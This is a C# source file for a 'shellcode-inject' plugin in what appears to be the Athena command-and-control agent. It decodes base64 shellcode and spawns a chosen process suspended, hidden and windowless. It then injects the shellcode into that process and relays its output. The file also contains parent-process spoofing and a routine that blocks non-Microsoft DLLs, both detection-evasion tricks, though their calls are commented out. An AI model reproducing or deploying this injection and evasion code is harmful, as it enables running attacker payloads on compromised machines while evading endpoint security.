using Athena.Plugins;
using Athena.Utilities;
using shellcode_inject.Techniques;
using Microsoft.Win32.SafeHandles;
using System.Runtime.InteropServices;
using shellcode_inject;

namespace Plugins
{
    public class ShellcodeInject : AthenaPlugin
    {
        public override string Name => "shellcode-inject";
        private ITechnique technique = new MVS();
        public override void Execute(Dictionary<string, string> args)
        {
            string action = args["action"];

            //if (!string.IsNullOrEmpty(args["technique"]))
            //{
            //    int choice;
            //    if (int.TryParse(args["technique"], out choice))
            //    {
            //        switch (choice) //The plugin will default to whatever the previous specified technique was
            //        {
            //            case 1:
            //                technique = new CRT();
            //                break;
            //            case 2:
            //            default:
            //                technique = new MVS();
            //                break;
            //        }
            //    }
            //}

            if (!string.IsNullOrEmpty(args["asm"]) && !string.IsNullOrEmpty(args["processName"]))
            {
                bool spoofParent = false;
                bool blockDlls = false;
                int parent = 0;

                byte[] b = Misc.Base64DecodeToByteArray(args["asm"]);
                Console.WriteLine(b.Length);

                //if (!string.IsNullOrEmpty(args["parent"]))
                //{
                //    if (int.TryParse(args["parent"], out parent))
                //    {
                //        spoofParent = true;
                //    }
                //}

                //if (bool.Parse(args["blockdlls"]))
                //{
                //    blockDlls = true;
                //}

                InjectNewProcess(args["processName"], spoofParent, blockDlls, parent, technique, b, args["task-id"]);
            }
        }
        static bool InjectNewProcess(string processName, bool spoofParent, bool blockDlls, int parentProcessId, ITechnique method, byte[] sc, string task_id)
        {
            //Credit for a lot of this code goes to #leoloobeek
            //https://github.com/leoloobeek/csharp/blob/master/ExecutionTesting.cs

            var saHandles = new Native.SECURITY_ATTRIBUTES();
            saHandles.nLength = Marshal.SizeOf(saHandles);
            saHandles.bInheritHandle = true;
            saHandles.lpSecurityDescriptor = IntPtr.Zero;

            IntPtr hStdOutRead;
            IntPtr hStdOutWrite;
            // Duplicate handle created just in case
            IntPtr hDupStdOutWrite = IntPtr.Zero;

            // Create the pipe and make sure read is not inheritable
            Native.CreatePipe(out hStdOutRead, out hStdOutWrite, ref saHandles, 0);
            Native.SetHandleInformation(hStdOutRead, Native.HANDLE_FLAGS.INHERIT, 0);

            var pInfo = new Native.PROCESS_INFORMATION();
            var siEx = new Native.STARTUPINFOEX();

            // Be sure to set the cb member of the STARTUPINFO structure to sizeof(STARTUPINFOEX).
            siEx.StartupInfo.cb = Marshal.SizeOf(siEx);
            IntPtr lpValueProc = IntPtr.Zero;

            // Values will be overwritten if parentProcessId > 0
            siEx.StartupInfo.hStdError = hStdOutWrite;
            siEx.StartupInfo.hStdOutput = hStdOutWrite;

            var lpSize = IntPtr.Zero;
            var success = Native.InitializeProcThreadAttributeList(IntPtr.Zero, 2, 0, ref lpSize);
            if (success || lpSize == IntPtr.Zero)
            {
                return false;
            }

            siEx.lpAttributeList = Marshal.AllocHGlobal(lpSize);
            success = Native.InitializeProcThreadAttributeList(siEx.lpAttributeList, 2, 0, ref lpSize);
            if (!success)
            {
                PluginHandler.WriteLine($"Error: {Marshal.GetLastPInvokeError()}", task_id, true, "error");
                return false;
            }

            if (blockDlls)
            {
                AddBlockDLLs(ref siEx, ref lpSize);
            }

            if (spoofParent)
            {
                AddSpoofParent(parentProcessId, ref siEx, ref lpValueProc, ref hStdOutWrite, ref hDupStdOutWrite);

            }

            siEx.StartupInfo.dwFlags = Native.STARTF_USESHOWWINDOW | Native.STARTF_USESTDHANDLES;
            siEx.StartupInfo.wShowWindow = Native.SW_HIDE;

            var ps = new Native.SECURITY_ATTRIBUTES();
            var ts = new Native.SECURITY_ATTRIBUTES();
            ps.nLength = Marshal.SizeOf(ps);
            ts.nLength = Marshal.SizeOf(ts);

            bool ret = Native.CreateProcess(null, processName, ref ps, ref ts, true, Native.EXTENDED_STARTUPINFO_PRESENT | Native.CREATE_NO_WINDOW | Native.CREATE_SUSPENDED, IntPtr.Zero, null, ref siEx, out pInfo);
            if (!ret)
            {
                PluginHandler.WriteLine($"Failed to start: {Marshal.GetLastPInvokeError()}", task_id, true, "error");
                return false;
            }

            PluginHandler.WriteLine($"Process Started with ID: {pInfo.dwProcessId}", task_id, false);

            method.Inject(sc, pInfo.hProcess);

            GetProcessOutput(lpValueProc, hStdOutRead, pInfo, siEx, task_id);

            return pInfo.hProcess != IntPtr.Zero;
        }
        static bool AddBlockDLLs(ref Native.STARTUPINFOEX siEx, ref IntPtr lpSize)
        {
            //Initializes the specified list of attributes for process and thread creation.

            IntPtr lpMitigationPolicy = Marshal.AllocHGlobal(IntPtr.Size);
            Marshal.WriteInt64(lpMitigationPolicy, Native.PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON);

            // Add Microsoft-only DLL protection to our StartupInfoEx struct
            var success = Native.UpdateProcThreadAttribute(
                siEx.lpAttributeList,
                0,
                (IntPtr)Native.PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY,
                lpMitigationPolicy,
                (IntPtr)IntPtr.Size,
                IntPtr.Zero,
                IntPtr.Zero);
            if (!success)
            {
                Console.WriteLine("[!] Failed to set process mitigation policy");
                return false;
            }
            return true;
        }
        static bool AddSpoofParent(int parentProcessId, ref Native.STARTUPINFOEX siEx, ref IntPtr lpValueProc, ref IntPtr hStdOutWrite, ref IntPtr hDupStdOutWrite)
        {
            //Get a handle to the parent process
            IntPtr parentHandle = Native.OpenProcess(Native.ProcessAccessFlags.CreateProcess | Native.ProcessAccessFlags.DuplicateHandle, false, parentProcessId);
            // This value should persist until the attribute list is destroyed using the DeleteProcThreadAttributeList function
            lpValueProc = Marshal.AllocHGlobal(IntPtr.Size);
            Marshal.WriteIntPtr(lpValueProc, parentHandle);

            //Updates the parent process ID
            bool success = Native.UpdateProcThreadAttribute(
                siEx.lpAttributeList,
                0,
                (IntPtr)Native.PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
                lpValueProc,
                (IntPtr)IntPtr.Size,
                IntPtr.Zero,
                IntPtr.Zero);

            if (!success)
            {
                return false;
            }

            IntPtr hCurrent = System.Diagnostics.Process.GetCurrentProcess().Handle;
            IntPtr hNewParent = Native.OpenProcess(Native.ProcessAccessFlags.DuplicateHandle, true, parentProcessId);

            success = Native.DuplicateHandle(hCurrent, hStdOutWrite, hNewParent, ref hDupStdOutWrite, 0, true, Native.DUPLICATE_CLOSE_SOURCE | Native.DUPLICATE_SAME_ACCESS);

            if (!success)
            {
                Console.WriteLine($"Error: {Marshal.GetLastWin32Error()}");
                return false;
            }

            //The old handle would get overwritten if we're process spoofing, so we apply our backup handle here
            siEx.StartupInfo.hStdError = hDupStdOutWrite;
            siEx.StartupInfo.hStdOutput = hDupStdOutWrite;

            return true;
        }
        static bool GetProcessOutput(IntPtr lpValueProc, IntPtr hStdOutRead, Native.PROCESS_INFORMATION pInfo, Native.STARTUPINFOEX siEx, string task_id)
        {
            try
            {
                SafeFileHandle safeHandle = new SafeFileHandle(hStdOutRead, false);
                var reader = new StreamReader(new FileStream(safeHandle, FileAccess.Read, 4096, false), true);
                bool exit = false;
                try
                {
                    do
                    {
                        if (Native.WaitForSingleObject(pInfo.hProcess, 100) == 0)
                        {
                            exit = true;
                        }

                        char[] buf = null;
                        int bytesRead;

                        uint bytesToRead = 0;

                        bool peekRet = Native.PeekNamedPipe(hStdOutRead, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, ref bytesToRead, IntPtr.Zero);

                        if (peekRet == true && bytesToRead == 0)
                        {
                            if (exit == true)
                            {
                                PluginHandler.WriteLine("Finished.", task_id, true);
                                break;
                            }
                            else
                            {
                                continue;
                            }
                        }

                        if (bytesToRead > 4096)
                            bytesToRead = 4096;

                        buf = new char[bytesToRead];
                        bytesRead = reader.Read(buf, 0, buf.Length);
                        if (bytesRead > 0)
                        {
                            PluginHandler.Write(new string(buf), "", false);
                        }

                    } while (true);
                    reader.Close();
                }
                finally
                {
                    if (!safeHandle.IsClosed)
                    {
                        safeHandle.Close();
                    }
                }

                if (hStdOutRead != IntPtr.Zero)
                {
                    Native.CloseHandle(hStdOutRead);
                }
            }
            finally
            {
                // Free the attribute list
                if (siEx.lpAttributeList != IntPtr.Zero)
                {
                    Native.DeleteProcThreadAttributeList(siEx.lpAttributeList);
                    Marshal.FreeHGlobal(siEx.lpAttributeList);
                }
                Marshal.FreeHGlobal(lpValueProc);

                // Close process and thread handles
                if (pInfo.hProcess != IntPtr.Zero)
                {
                    Native.CloseHandle(pInfo.hProcess);
                }
                if (pInfo.hThread != IntPtr.Zero)
                {
                    Native.CloseHandle(pInfo.hThread);
                }
            }
            return true;
        }
    }
}